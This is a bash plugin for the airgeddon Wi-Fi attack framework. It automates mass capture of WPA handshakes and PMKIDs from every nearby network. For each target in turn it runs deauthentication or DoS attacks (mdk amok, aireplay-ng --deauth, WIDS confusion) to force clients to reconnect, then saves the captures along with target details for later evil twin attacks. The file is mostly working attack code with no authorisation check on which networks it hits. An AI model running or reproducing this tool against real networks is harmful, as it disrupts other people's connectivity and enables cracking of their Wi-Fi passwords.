#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Mass Handshake Capture"
plugin_description="Automated mass Handshake/PMKID capture for nearby networks"
plugin_author="xpz3"

#Enable/Disable Plugin 1=Enabled, 0=Disabled
plugin_enabled=1

plugin_minimum_ag_affected_version="11.11"
plugin_maximum_ag_affected_version=""

plugin_distros_supported=("*")

# User defined values

# The time in seconds for the DoS attack to run and deauth any clients
mass_handshake_capture_dos_attack_timeout=15

#The time in seconds to wait for capturing a handshake after the DoS attack windows gets automatically closed by airgeddon
handshake_capture_timeout_after_dos_exits=10
 
timeout_capture_handshake="${handshake_capture_timeout_after_dos_exits}"
timeout="${timeout_capture_handshake}"

#Default path to save captured targets will be set as <current_path_to_airgeddon/plugins/captured_handshakes/ if the path below is not set
mass_handshake_capture_default_save_path=""

#AP blacklist file name
mass_handshake_capture_ap_blacklist_name="ap_blacklist.txt"

#Default path to AP blacklist to avoid capturing handshake/PMKID for already captured ones
mass_handshake_capture_default_blacklist_path=""

#Enable/Disable AP blacklist
mass_handshake_capture_enable_blacklist=1

#Save target AP details on successful handshake/PMKID capture to automate evil twin on the target
mass_handshake_capture_save_target=1

#Default path to save target AP details
mass_handshake_capture_ap_details_path=""

# End of user defined values

function mass_handshake_capture_override_handshake_pmkid_tools_menu() {

	debug_print

	clear
	language_strings "${language}" 120 "title"
	current_menu="handshake_pmkid_tools_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 124 "separator"
	language_strings "${language}" 663 pmkid_dependencies[@]
	language_strings "${language}" 121
	print_simple_separator
	language_strings "${language}" 122 clean_handshake_dependencies[@]
	language_strings "${language}" "mass_handshake_capture_text_1"
	print_hint ${current_menu}

	read -rp "> " handshake_option
	case ${handshake_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option "WPA"
		;;
		5)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				capture_pmkid_handshake "pmkid"
			fi
		;;
		6)
			capture_pmkid_handshake "handshake"
		;;
		7)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				clean_handshake_file_option
			fi
		;;
		8)
			mass_handshake_capture "handshake"
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_pmkid_tools_menu
}

function mass_handshake_capture_capture_pmkid_handshake() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]]; then

		if ! explore_for_targets_option "WPA"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi


	if [ "${1}" = "handshake" ]; then
		mass_handshake_capture_dos_handshake_menu
		mass_handshake_capture_launch_handshake_capture
	else
		return
	fi
}

function mass_handshake_capture_check_bssid_in_captured_file() {

	debug_print

	local nets_from_file
	nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${3}" = "also_pmkid" ]; then
		get_aircrack_version
		if compare_floats_greater_or_equal "${aircrack_version}" "${aircrack_pmkid_version}"; then
			local nets_from_file2
			nets_from_file2=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
		fi
	fi

	if [ "${2}" != "silent" ]; then
		if [ ! -f "${1}" ]; then
			return 1
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "only_handshake" ]]; then
			if [ "${nets_from_file}" = "" ]; then
				return 1
			fi
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			if [[ "${nets_from_file}" = "" ]] && [[ "${nets_from_file2}" = "" ]]; then
				return 1
			fi
		fi
	fi

	declare -A bssids_detected
	declare -A bssids_detected_pmkid

	local option_counter
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		option_counter=0
		for item in ${nets_from_file2}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
				option_counter=$((option_counter + 1))
				bssids_detected_pmkid[${option_counter}]=${item}
			fi
		done
	fi

	local handshake_captured=0
	local pmkid_captured=0

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			handshake_captured=1
			break
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		for targetbssid in "${bssids_detected_pmkid[@]}"; do
			if [ "${bssid}" = "${targetbssid}" ]; then
				pmkid_captured=1
				break
			fi
		done
	fi

	if [[ "${handshake_captured}" = "1" ]] || [[ "${pmkid_captured}" = "1" ]]; then
		if [[ "${2}" = "showing_msgs_capturing" ]] || [[ "${2}" = "showing_msgs_checking" ]]; then
			if ! is_wpa2_handshake "${1}" "${bssid}"; then
				return 2
			fi
		fi
	fi

	if [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "0" ]]; then
		return 0
	elif [[ "${handshake_captured}" = "0" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		return 0
	elif [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		return 0
	else
		return 1
	fi
}

function mass_handshake_capture_handshake_capture_check() {

	debug_print

	local time_counter=0
	while true; do
		sleep 5
		if mass_handshake_capture_check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent" "only_handshake"; then
			break
		fi

		time_counter=$((time_counter + 5))
		if [ ${time_counter} -ge ${timeout_capture_handshake} ]; then
			break
		fi
	done

	kill "${processidcapture}" &> /dev/null
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:Capturing Handshake"
	fi
}

function mass_handshake_capture_launch_handshake_capture() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
	else
		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Capturing Handshake" &> /dev/null
	fi

	mass_handshake_capture_handshake_capture_check

	mass_handshake_capture_check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"
	case "$?" in
		"0")
			mass_handshake_capture_captured_handshakes_counter=$((mass_handshake_capture_captured_handshakes_counter + 1))
			handshakepath="${mass_handshake_capture_default_save_path}"
			handshakefilename="handshake-${bssid}.cap"
			handshakepath="${handshakepath}${handshakefilename}"
			enteredpath="${handshakepath}"
			if [ "${mass_handshake_capture_enable_blacklist}" -eq 1 ];then
					echo "${essid}" >>"${mass_handshake_capture_default_blacklist_path}${mass_handshake_capture_ap_blacklist_name}"
			fi
			if [ "${mass_handshake_capture_save_target}" -eq 1 ];then
					echo "${essid}|${bssid}|${channel}|${enc}|${handshakepath}" >>"${mass_handshake_capture_ap_details_path}${essid}.txt"
			fi

			cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
		;;
		"1")
			return
		;;
		"2")
			return
		;;
	esac
}

function mass_handshake_capture_capture_handshake_window() {

	debug_print

	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -sb -rightbar -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}"
		processidcapture="${global_process_pid}"
		global_process_pid=""
	else
		processidcapture=$!
	fi
}

function mass_handshake_capture_dos_handshake_menu() {

	debug_print

	if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
		clear
		language_strings "${language}" "mass_handshake_capture_text_2" "title"
		current_menu="dos_handshake_menu"
		initialize_menu_and_print_selections
		echo
		language_strings "${language}" 47 "green"
		print_simple_separator
		language_strings "${language}" 147
		print_simple_separator
		language_strings "${language}" 139 mdk_attack_dependencies[@]
		language_strings "${language}" 140 aireplay_attack_dependencies[@]
		language_strings "${language}" 141 mdk_attack_dependencies[@]
		print_hint ${current_menu}
		read -rp "> " attack_handshake_option
		clear
		language_strings "${language}" "mass_handshake_capture_text_2" "title"
		print_iface_selected
		print_all_target_vars
		language_strings "${language}" "mass_handshake_capture_text_3" "yellow"
	fi

	case ${attack_handshake_option} in
		0)
			return
		;;
		1)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
					if [ -z "${handshake_capture_timeout_after_dos_exits}" ];then
						ask_timeout "capture_handshake"
					fi
				fi
				mass_handshake_capture_capture_handshake_window
				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
				echo "${bssid}" > "${tmpdir}bl.txt"
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack="${mass_handshake_capture_dos_attack_timeout}"
			fi
		;;
		2)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
					if [ -z "${handshake_capture_timeout_after_dos_exits}" ];then
						ask_timeout "capture_handshake"
					fi
				fi
				mass_handshake_capture_capture_handshake_window
				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack="${mass_handshake_capture_dos_attack_timeout}"
			fi
		;;
		3)
			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
					if [ -z "${handshake_capture_timeout_after_dos_exits}" ];then
						ask_timeout "capture_handshake"
					fi
				fi
				mass_handshake_capture_capture_handshake_window
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack="${mass_handshake_capture_dos_attack_timeout}"
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac
}
function mass_handshake_capture_get_absolute_script_path() {

	debug_print

	if [ "${0}" != "${scriptname}" ];then
		mass_handshake_capture_relative_path=$(pwd)
		cd "${mass_handshake_capture_relative_path}"
		cd "${0%/*}"
		mass_handshake_capture_absolute_script_path=$(pwd)
	else
		mass_handshake_capture_absolute_script_path=$(pwd)
	fi
}

function mass_handshake_capture() {

	debug_print

	if [[ $(ls "${scriptfolder}" | grep "${scriptname}") == "" ]];then
		mass_handshake_capture_get_absolute_script_path
	else
		mass_handshake_capture_absolute_script_path="${scriptfolder}"
	fi
	if [ -z "${mass_handshake_capture_default_save_path}" ];then
		mass_handshake_capture_default_save_path="${mass_handshake_capture_absolute_script_path}"plugins/captured_handshakes/
		mass_handshake_capture_default_blacklist_path="${mass_handshake_capture_default_save_path}"
	fi
	if [ -z "${mass_handshake_capture_default_blacklist_path}" ];then
		mass_handshake_capture_default_blacklist_path="${mass_handshake_capture_default_save_path}"
	fi
	if [ -z "${mass_handshake_capture_ap_details_path}" ];then
		mass_handshake_capture_ap_details_path="${mass_handshake_capture_default_save_path}"targets/
	fi

	if [ ! -d "${mass_handshake_capture_default_save_path}" ]; then
		mkdir "${mass_handshake_capture_default_save_path}"
	fi
	mass_handshake_capture_captured_handshakes_counter=0
	mass_handshake_capture_grab_wpa_targets "WPA"

	essid=""
	channel=""
	bssid=""
	enc=""
	network_names=()
	channels=()
	macs=()
	encs=()
}

function mass_handshake_capture_grab_wpa_targets() {

	debug_print
	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo

	local cypher_filter
	if [ -n "${1}" ]; then
		cypher_filter="${1}"
		case ${cypher_filter} in
			"WPA")
				#All, WPA, WPA2 and WPA3 including all Mixed modes
				if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
					return
				else
					language_strings "${language}" 215 "blue"
					echo
					language_strings "${language}" 361 "yellow"
				fi
			;;
		esac
		cypher_cmd=" --encrypt ${cypher_filter} "
	else
		return
	fi
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1

	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		airodump_band_modifier="bg"
	else
		airodump_band_modifier="abg"
	fi

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for targets\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
	wait_for_process "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets"
	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' "${tmpdir}nws-01.csv" 2> /dev/null)
	targetline=$((targetline - 1))
	head -n "${targetline}" "${tmpdir}nws-01.csv" 2> /dev/null &> "${tmpdir}nws.csv"
	tail -n +"${targetline}" "${tmpdir}nws-01.csv" 2> /dev/null &> "${tmpdir}clts.csv"

	csvline=$(wc -l "${tmpdir}nws.csv" 2> /dev/null | awk '{print $1}')
	if [ "${csvline}" -le 3 ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	rm -rf "${tmpdir}nws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	local i=0
	local enterprise_network_counter
	local pure_wpa3
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do

		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i + 1))
			if [ "${exp_power}" -lt 0 ]; then
				if [ "${exp_power}" -eq -1 ]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}

			if [[ ${exp_channel} =~ ${valid_channels_24_and_5_ghz_regexp} ]]; then
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			else
				exp_channel=0
			fi

			if [[ "${exp_essid}" = "" ]] || [[ "${exp_channel}" = "-1" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			if [ -n "${1}" ]; then
				case ${cypher_filter} in
					"WEP")
						#Only WEP
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA1")
						#Only WPA including WPA/WPA2 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA2")
						#Only WPA2 including WPA/WPA2 and WPA2/WPA3 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA3")
						#Only WPA3 including WPA2/WPA3 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
					;;
					"WPA")
						if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
							if [[ "${exp_auth}" =~ "MGT" ]]; then
								enterprise_network_counter=$((enterprise_network_counter + 1))
								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
							fi
						else
							[[ ${exp_auth} =~ ^[[:blank:]](SAE)$ ]] && pure_wpa3="${BASH_REMATCH[1]}"
							if [ "${pure_wpa3}" != "SAE" ]; then
								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
							fi
						fi
					;;
				esac
			else
				echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
			fi
		fi
	done < "${tmpdir}nws.csv"

	if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]] && [[ ${enterprise_network_counter} -eq 0 ]]; then
		return
	fi

	sort -t "," -d -k 4 "${tmpdir}nws.txt" > "${tmpdir}wnws.txt"
	grep -v "Hidden" "${tmpdir}wnws.txt" > "${tmpdir}wnws1.txt" && mv "${tmpdir}wnws1.txt" "${tmpdir}wnws.txt"
	if [ "${mass_handshake_capture_enable_blacklist}" -eq 1 ];then
		grep -vFf "${mass_handshake_capture_default_blacklist_path}${mass_handshake_capture_ap_blacklist_name}" "${tmpdir}wnws.txt" >"${tmpdir}wnws2.txt" && mv "${tmpdir}wnws2.txt" "${tmpdir}wnws.txt"
	fi
	mass_handshake_capture_get_targets_count
	mass_handshake_capture_automate
}

function mass_handshake_capture_get_targets_count() {

	debug_print

	mass_handshake_capture_targets_count=$(wc -l "${tmpdir}wnws.txt" 2> /dev/null | awk '{print $1}')
}

function mass_handshake_capture_automate() {

	debug_print

	local mass_handshake_capture_target_counter=1

	while [ "${mass_handshake_capture_target_counter}" -le "${mass_handshake_capture_targets_count}" ]; do
		mass_handshake_capture_select_target_and_start_capturing
		mass_handshake_capture_target_counter=$((mass_handshake_capture_target_counter + 1))
	done
	language_strings "${language}" "mass_handshake_capture_text_4" "yellow"
	language_strings "${language}" 115 "read"
}

function mass_handshake_capture_select_target_and_start_capturing() {

	debug_print

	mass_handshake_capture_read_targets
}

function mass_handshake_capture_read_targets() {

	debug_print

	local i=0
	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$((i + 1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [ "${exp_channel}" -le 9 ]; then
			sp2="  "
			if [ "${exp_channel}" -eq 0 ]; then
				exp_channel="-"
			fi
			if [ "${exp_channel}" -lt 0 ]; then
				sp2=" "
			fi
		elif [[ ${exp_channel} -ge 10 ]] && [[ ${exp_channel} -lt 99 ]]; then
			sp2=" "
		else
			sp2=""
		fi

		if [ "${exp_power}" = "" ]; then
			exp_power=0
		fi

		if [ "${exp_power}" -le 9 ]; then
			sp4=" "
		else
			sp4=""
		fi

		airodump_color="${normal_color}"
		client=$(grep "${exp_mac}" < "${tmpdir}clts.csv")
		if [ "${client}" != "" ]; then
			airodump_color="${yellow_color}"
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ "${enc_length}" -gt 3 ]; then
			sp6=""
		elif [ "${enc_length}" -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names[$i]=${exp_essid}
		channels[$i]=${exp_channel}
		macs[$i]=${exp_mac}
		encs[$i]=${exp_enc}
	done < "${tmpdir}wnws.txt"

	essid=${network_names[${mass_handshake_capture_target_counter}]}
	channel=${channels[${mass_handshake_capture_target_counter}]}
	bssid=${macs[${mass_handshake_capture_target_counter}]}
	enc=${encs[${mass_handshake_capture_target_counter}]}

	clear
	language_strings "${language}" "mass_handshake_capture_text_2" "title"
	print_iface_selected
	print_all_target_vars
	language_strings "${language}" "mass_handshake_capture_text_3" "yellow"
	mass_handshake_capture_capture_pmkid_handshake "handshake"
}

function initialize_mass_handshake_capture_language_strings() {

	debug_print
	
	arr["ENGLISH","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["SPANISH","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["FRENCH","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["CATALAN","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["PORTUGUESE","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["RUSSIAN","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["GREEK","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["ITALIAN","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["POLISH","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["GERMAN","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["TURKISH","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["ARABIC","mass_handshake_capture_text_1"]="8.  Mass Handshake/PMKID Capture"
	arr["CHINESE","mass_handshake_capture_text_1"]="8.  大规模 Handshake/PMKID 捕获"
	
	arr["ENGLISH","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["SPANISH","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["FRENCH","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["CATALAN","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["PORTUGUESE","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["RUSSIAN","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["GREEK","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["ITALIAN","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["POLISH","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["GERMAN","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["TURKISH","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["ARABIC","mass_handshake_capture_text_2"]="Mass Handshake/PMKID Capture"
	arr["CHINESE","mass_handshake_capture_text_2"]="大规模 Handshake/PMKID 捕获"
	
	arr["ENGLISH","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["SPANISH","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["FRENCH","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["CATALAN","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["PORTUGUESE","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["RUSSIAN","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["GREEK","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["ITALIAN","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["POLISH","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["GERMAN","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["TURKISH","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["ARABIC","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["CHINESE","mass_handshake_capture_text_3"]="尝试 AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	
	arr["ENGLISH","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["SPANISH","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["FRENCH","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["CATALAN","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["PORTUGUESE","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["RUSSIAN","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["GREEK","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["ITALIAN","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["POLISH","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["GERMAN","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["TURKISH","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["ARABIC","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
	arr["CHINESE","mass_handshake_capture_text_4"]="捕获完成 \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID from \${mass_handshake_capture_targets_count} APs"
}

initialize_mass_handshake_capture_language_strings
